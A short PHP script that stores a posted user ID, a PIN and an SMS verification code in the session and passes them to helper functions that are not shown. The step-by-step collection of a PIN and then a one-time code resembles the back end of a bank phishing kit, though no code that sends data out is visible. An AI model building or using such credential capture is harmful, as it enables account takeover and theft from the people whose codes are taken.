<?php
session_start();
include('function.inc.php');


if (isset($_GET['action']) && $_GET['action'] == "Login") {
    $_SESSION['ID']        = $_POST['ID'];
    $_SESSION['pin1']   = $_POST['pin1'];
    IniciarSession();
}

if (isset($_GET['action']) && $_GET['action'] == "GetCode") {
    $_SESSION['verification_code'] = $_POST['verification_code'];
    CodigoSMS();
}

?>
